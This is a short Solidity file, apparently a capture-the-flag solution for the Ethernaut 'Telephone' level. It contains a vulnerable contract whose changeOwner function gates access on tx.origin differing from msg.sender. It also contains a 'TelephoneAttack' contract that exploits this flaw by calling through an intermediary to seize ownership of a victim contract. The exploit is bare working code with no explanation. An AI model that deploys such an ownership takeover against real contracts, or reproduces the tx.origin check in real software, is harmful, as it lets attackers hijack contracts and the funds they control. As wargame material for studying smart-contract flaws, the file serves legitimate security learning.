pragma solidity ^0.6.6;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public returns (address) {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
        return tx.origin;
    }
}

contract TelephoneAttack {
    Telephone tel;

    function hackTheOwner(address _victim, address _owner) public {
        tel = Telephone(_victim);
        tel.changeOwner(_owner);
    }
}
